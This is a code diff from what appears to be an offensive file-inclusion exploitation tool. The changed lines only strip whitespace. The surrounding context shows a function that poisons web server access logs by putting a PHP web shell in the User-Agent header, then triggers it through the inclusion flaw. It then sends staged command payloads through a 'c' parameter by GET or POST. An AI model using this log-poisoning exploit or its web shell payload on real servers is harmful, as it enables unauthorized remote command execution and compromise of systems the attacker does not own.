@@ -15,7 +15,7 @@ def exploit_log_poison(ip, port, url, payloadStageOne, payloadStageTwo, testPayl
 
     maliciousHeaders = args.httpheaders.copy()
     maliciousHeaders['User-Agent'] = "<?php system($_GET['c']); ?>"
-    
+
     if(not os.path.exists(scriptDirectory + os.sep + "src/wordlists/http_access_log.txt")):
         print(colors.red("[-]") + " Cannot locate '" + scriptDirectory + os.sep + "src/wordlists/http_access_log.txt" + "' file that contains log locations")
         return
@@ -40,7 +40,7 @@ def exploit_log_poison(ip, port, url, payloadStageOne, payloadStageTwo, testPayl
                 res, _ = request.REQUEST(exploitUrl, args.httpheaders, config.proxies, "", "", exploit = True)
                 if(testString in res.text):
                     printInfo(ip, port, "bash", "access log posioning")
-                      
+
                     if(args.postreq):
                         #Stage 1
                         exploitPost = post + "&c=" + payloadStageOne
@@ -51,12 +51,12 @@ def exploit_log_poison(ip, port, url, payloadStageOne, payloadStageTwo, testPayl
                             request.REQUEST(url, exploitPost, args.httpheaders, config.proxies, "", "", exploit = True)
                             exploitPost = u + "&c=" + payloadStageTwo
                         return True
-                    
+
                     else:
                         #Stage 1
                         exploitUrl = u+ "&c=" + payloadStageOne
                         request.REQUEST(exploitUrl, args.httpheaders, config.proxies, "", "", exploit = True)
-                        
+
                         if(payloadStageTwo != ""):
                             #Stage 2
                             exploitUrl = u+ "&c=" + payloadStageTwo
